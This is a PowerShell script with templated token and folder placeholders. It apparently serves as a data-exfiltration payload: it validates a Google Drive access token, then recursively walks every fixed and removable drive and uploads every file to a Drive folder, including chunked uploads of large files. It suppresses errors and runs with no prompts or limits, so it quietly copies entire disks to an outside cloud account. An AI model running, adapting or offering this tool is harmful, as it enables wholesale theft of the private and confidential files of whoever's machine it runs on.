$ACCESS_TOKEN = "{{ACCESS_TOKEN}}"
$GOOGLE_DRIVE_FOLDER_NAME = "{{FOLDER}}"
$CHUNK_SIZE = 8388608
$global:totalFiles = 0
$global:uploadedFiles = 0
$global:failedFiles = 0
$global:rootFolderId = $null

function Test-Token {
    try {
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
        }
        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/drive/v3/about?fields=user" -Method Get -Headers $headers -ErrorAction Stop
        return $true
    }
    catch {
        return $false
    }
}

function Find-FolderByName($folderName, $parentId = $null) {
    try {
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
        }
        $query = "name='$folderName' and mimeType='application/vnd.google-apps.folder' and trashed=false"
        if ($parentId) {
            $query += " and '$parentId' in parents"
        }
        $url = "https://www.googleapis.com/drive/v3/files?q=$([System.Web.HttpUtility]::UrlEncode($query))&fields=files(id,name)&pageSize=10"
        $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers -ErrorAction Stop
        if ($response.files -and $response.files.Count -gt 0) {
            return $response.files[0].id
        }
        return $null
    }
    catch {
        return $null
    }
}

function Create-FolderInGoogleDrive($folderName, $parentId = $null) {
    try {
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/json"
        }
        $body = @{
            name = $folderName
            mimeType = "application/vnd.google-apps.folder"
        }
        if ($parentId) {
            $body.parents = @($parentId)
        }
        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/drive/v3/files" -Method Post -Headers $headers -Body ($body | ConvertTo-Json) -ErrorAction Stop
        return $response.id
    }
    catch {
        return $null
    }
}

function Initialize-RootFolder {
    if ($GOOGLE_DRIVE_FOLDER_NAME -and $GOOGLE_DRIVE_FOLDER_NAME -ne "") {
        $folderId = Find-FolderByName $GOOGLE_DRIVE_FOLDER_NAME
        if ($folderId) {
            $global:rootFolderId = $folderId
        } else {
            $newFolderId = Create-FolderInGoogleDrive $GOOGLE_DRIVE_FOLDER_NAME
            if ($newFolderId) {
                $global:rootFolderId = $newFolderId
            } else {
                $global:rootFolderId = $null
            }
        }
    } else {
        $global:rootFolderId = $null
    }
}

function Create-FolderStructure($folderPath) {
    if ([string]::IsNullOrEmpty($folderPath)) {
        return $global:rootFolderId
    }
    $parts = $folderPath -split '/' | Where-Object { $_ -ne "" }
    $currentParentId = $global:rootFolderId
    foreach ($part in $parts) {
        $folderId = Find-FolderByName $part $currentParentId
        if ($folderId) {
            $currentParentId = $folderId
        } else {
            $newFolderId = Create-FolderInGoogleDrive $part $currentParentId
            if ($newFolderId) {
                $currentParentId = $newFolderId
            }
        }
    }
    return $currentParentId
}

function Upload-SmallFileToGoogleDrive($localFile, $parentId) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/json"
        }
        $metadata = @{
            name = $fileName
            parents = @($parentId)
        } | ConvertTo-Json
        $emptyFile = Invoke-RestMethod -Uri "https://www.googleapis.com/drive/v3/files" -Method Post -Headers $headers -Body $metadata -ErrorAction Stop
        $updateHeaders = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/octet-stream"
        }
        $fileBytes = [System.IO.File]::ReadAllBytes($localFile)
        Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files/$($emptyFile.id)?uploadType=media" -Method Patch -Headers $updateHeaders -Body $fileBytes -ErrorAction Stop | Out-Null
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
        return $true
    }
    catch {
        $global:failedFiles++
        Write-Host "Uploaded: $fileName - Failed"
        return $false
    }
}

function Upload-LargeFileToGoogleDrive($localFile, $parentId) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/json"
            "X-Upload-Content-Type" = "application/octet-stream"
            "X-Upload-Content-Length" = (Get-Item $localFile).Length.ToString()
        }
        $metadata = @{
            name = $fileName
            parents = @($parentId)
        } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable" -Method Post -Headers $headers -Body $metadata -ErrorAction Stop
        $uploadUrl = $response.location
        $fileSize = (Get-Item $localFile).Length
        $stream = [System.IO.File]::OpenRead($localFile)
        $offset = 0
        $buffer = New-Object byte[] $CHUNK_SIZE
        while ($true) {
            $bytesRead = $stream.Read($buffer, 0, $CHUNK_SIZE)
            if ($bytesRead -eq 0) { break }
            $chunk = $buffer[0..($bytesRead-1)]
            $endOffset = $offset + $bytesRead - 1
            $chunkHeaders = @{
                "Content-Length" = $bytesRead.ToString()
                "Content-Range" = "bytes $offset-$endOffset/$fileSize"
            }
            Invoke-RestMethod -Uri $uploadUrl -Method Put -Headers $chunkHeaders -Body $chunk -ErrorAction Stop | Out-Null
            $offset += $bytesRead
        }
        $stream.Close()
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
        return $true
    }
    catch {
        $global:failedFiles++
        Write-Host "Uploaded: $fileName - Failed"
        return $false
    }
}

function Upload-FileToGoogleDrive($localFile, $rootPath) {
    try {
        $relativePath = $localFile.Substring($rootPath.Length).TrimStart('\\')
        $relativePath = $relativePath.Replace("\\", "/")
        $folderPath = ""
        if ($relativePath.Contains("/")) {
            $folderPath = $relativePath.Substring(0, $relativePath.LastIndexOf("/"))
        }
        $parentId = Create-FolderStructure $folderPath
        if (-not $parentId -and $global:rootFolderId -eq $null) {
            $parentId = $null
        }
        $fileSize = (Get-Item $localFile).Length
        if ($fileSize -gt 5MB) {
            Upload-LargeFileToGoogleDrive $localFile $parentId
        } else {
            Upload-SmallFileToGoogleDrive $localFile $parentId
        }
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Scan-And-UploadToGoogleDrive($currentPath) {
    try {
        $items = Get-ChildItem -Path $currentPath -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if ($item.PSIsContainer) {
                Scan-And-UploadToGoogleDrive $item.FullName
            } else {
                $global:totalFiles++
                Upload-FileToGoogleDrive $item.FullName $currentPath
            }
        }
    }
    catch {
    }
}

$tokenValid = Test-Token
if (-not $tokenValid) {
    Write-Host "Token is invalid or expired."
} else {
    Initialize-RootFolder
    $logicalDisks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -or $_.DriveType -eq 2 }
    foreach ($disk in $logicalDisks) {
        $driveRoot = $disk.DeviceID + "\\"
        if (Test-Path $driveRoot) {
            Scan-And-UploadToGoogleDrive $driveRoot
        }
    }
    Write-Host "`nTotal files found: $($global:totalFiles)"
    Write-Host "Successfully uploaded: $($global:uploadedFiles)"
    Write-Host "Failed: $($global:failedFiles)"
}
